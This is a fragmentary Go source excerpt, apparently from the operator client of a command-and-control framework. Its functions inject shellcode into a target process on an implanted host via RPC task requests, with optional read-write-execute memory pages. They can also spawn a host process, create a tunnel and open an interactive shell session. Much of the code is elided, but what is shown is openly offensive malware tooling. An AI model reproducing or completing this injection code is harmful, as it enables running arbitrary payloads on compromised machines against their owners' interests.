...
func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
	...
	shellcodeTask, err := con.Rpc.Task(context.Background(), &revilspb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: rwxPages,
		Pid:      uint32(pid),
...
func PrintExecuteShellcode(task *revilspb.Task, con *console.RevilsConsoleClient) {
...
func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, con *console.RevilsConsoleClient) {
	...
	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &revilspb.Tunnel{
	...
	shell, err := con.Rpc.Shell(context.Background(), &revilspb.ShellReq{
		Request:   con.ActiveTarget.Request(ctx),
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	...
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.Task(context.Background(), &revilspb.TaskReq{
		Request:  con.ActiveTarget.Request(ctx),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
